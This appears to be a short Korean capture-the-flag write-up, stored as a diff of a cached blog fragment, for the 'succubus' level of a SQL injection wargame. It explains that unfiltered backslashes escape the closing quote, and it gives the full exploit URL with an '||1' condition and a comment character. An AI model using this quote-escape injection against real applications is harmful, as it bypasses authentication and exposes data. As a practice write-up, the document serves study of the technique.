@@ -1,0 +1,26 @@
+I"�<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select id from prob_succubus where id='' and pw=''
+</code></pre></div></div>
+
+<p>이렇게 생겼지만 잘보면 \를 필터링 안하고 있다.</p>
+
+<p>‘앞에 \가 붙어버리면 다른 문자로 인식해버리기 때문에</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=' \' and pw=' ' 
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>저 부분을 전부 id로 인식해 버린다. 즉 뒤에다가</td>
+      <td> </td>
+      <td>연산만 더해주면 끝</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://los.sandbox.cash/chall/succubus_1e73ac44ec838508bd2b2ce2026af8cf.php?id=\&amp;pw=||1%23
+</code></pre></div></div>
+
+<p>뒤에를 주석처리해주면 된다.</p>
+
+:ET
